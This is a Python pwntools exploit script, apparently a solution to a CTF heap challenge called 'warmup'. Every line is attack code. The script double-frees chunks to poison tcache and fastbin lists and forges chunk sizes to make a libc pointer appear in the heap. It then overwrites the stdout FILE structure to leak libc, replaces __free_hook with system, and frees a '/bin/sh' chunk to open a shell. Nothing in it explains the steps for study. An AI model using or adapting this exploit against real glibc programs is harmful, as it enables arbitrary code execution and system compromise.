from pwn import * 
sh = process("./warmup") 
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def add(content) : 
    sh.recv() 
    sh.sendline("1") 
    sh.recv() 
    sh.send(content) 

def delete(id) : 
    sh.recv() 
    sh.sendline("2") 
    sh.recv() 
    sh.sendline(str(id)) 

def edit(id, content) : 
    sh.recv() 
    sh.sendline("3") 
    sh.recv() 
    sh.sendline(str(id)) 
    sh.recv() 
    sh.send(content) 

def get_PIE(proc):
    memory_map = open("/proc/{}/maps".format(proc.pid),"rb").readlines()
    return int(memory_map[0].split("-")[0],16)

def debug(bp):
    #bp = [0xea0,0xd31,0xc52]
    #bp = [0x00000dfb,0x00000b7c,0x00000d10]
    script = ""
    PIE = get_PIE(sh)
    PAPA = PIE
    for x in bp:
        script += "b *0x%x\n"%(PIE+x)
    gdb.attach(sh,gdbscript=script) 

add("A")    # 0
add("C" * 0x30 + p64(0) + p64(0x51))    # 1 
add("B" * 0x30 + p64(0) + p64(0x1))     # 2 

delete(2) 
delete(1) 
delete(0) 
delete(0) 

add("\x70")     # 0     : chunk A 
add("\x60")     # 1     : chunk A 
add("\x60")     # 2     : chunk A 
add("\x00")     # 3     : edit size 

# stage 1 : fix size to unsorted bin 
delete(0)       # double free A to fastbin 
delete(0)   

edit(3, p64(0) + p64(0x91))     # A -> unsorted bin 
# debug([0xc00,0xd2a])
for i in range(7) : 
    delete(1)       # file tcache bins  
delete(1)       # free unsorted bin to get libc in the heap 

edit(3, p64(0) + p64(0x51))         # fix size to fastbin 

# Stage 2 : leak libc 
edit(2, "\x60\x07\xdd")       
add("A")    # 0
add(p64(0xfbda1800) + 3 * p64(0) + "\x00")      # 1 

sh.recv(8) 
libc.address = u64(sh.recv(6) + "\x00\x00") - 0x3ed8b0 
system = libc.sym['system'] 
_free_hook = libc.sym['__free_hook'] 
log.success("Libc = " + hex(libc.address)) 
log.success("System = " + hex(system)) 
log.success("__Free_hook = " + hex(_free_hook))  

# Stage 3 : overwrite free_hook to get shell 
delete(0) 
delete(0) 
add("\x00")         # 0 
edit(0, p64(_free_hook)) 
add("\x00") 
add(p64(system)) 

edit(2, "/bin/sh\x00") 
delete(2)

# debug([0xc00,0xd2a])
sh.interactive() 




